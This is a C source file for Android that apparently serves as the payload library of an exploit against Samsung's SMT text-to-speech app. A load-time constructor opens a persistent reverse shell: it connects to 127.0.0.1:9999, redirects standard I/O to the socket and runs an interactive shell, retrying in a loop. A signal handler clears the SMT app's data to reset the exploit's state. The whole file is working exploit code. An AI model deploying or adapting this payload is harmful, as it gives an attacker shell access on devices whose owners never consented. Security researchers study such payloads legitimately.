#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <android/log.h>
#include <signal.h>

#define LOG_TAG "smtshell"
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 9999

static void reverse_shell() {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    while (connect(s, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        LOGW("connect() error: %s", strerror(errno));
        sleep(1); // keep trying to connect
    }

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    system("/system/bin/sh -i");
}

/**
 * This is a bit of a hack, but allows us to easily reset the exploit's state,
 * and also kill the reverse shell if the user wants to, using `kill $PPID`.
 */
void sig_handler(int signo) {
    if (signo == SIGTERM) {
        LOGI("caught SIGTERM, clearing SMT data");
        system("pm clear com.samsung.SMT");
    }
}

__attribute__((constructor)) static void on_load() {
    LOGI("on_load() called, my uid is %d", getuid());
    if (signal(SIGTERM, sig_handler) == SIG_ERR) {
        LOGE("can't catch SIGTERM!");
    }

    while (1) {
        // loop so the client can reconnect after exiting
        reverse_shell();
        sleep(1);
    }
}
